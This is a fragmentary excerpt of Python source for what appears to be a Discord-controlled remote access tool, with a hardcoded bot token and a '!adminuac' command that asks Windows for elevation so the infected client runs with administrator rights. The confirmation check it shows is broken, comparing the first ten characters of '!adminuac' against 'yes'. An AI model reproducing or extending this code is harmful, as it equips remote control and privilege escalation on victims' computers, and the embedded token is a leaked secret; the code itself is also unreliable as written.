...
token = 'MTEyNzkxODI0NTQ5Njc1MDEzMQ.GRNgCt.BdhHo_DengErZ3JyKbnuZvGUiel-FCrDMGR8p4'
global isexe
isexe=False
if (sys.argv[0].endswith("exe")):
    isexe=True
...
--> !adminuac = gives current client admin perms if user clicks yes / syntax = "!adminuac yes"
"""
...
async def on_message(message):
    if message.channel.name != channel_name:
        ...
        if message.content == "!adminuac":
            confirmation = message.content[:10]
            if confirmation == "yes":
                ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
                await message.channel.send("[*] UAC has been requested to client")
            else:
                await message.channel.send("[*] `FAIL` Did not say Yes to UAC confirmation")
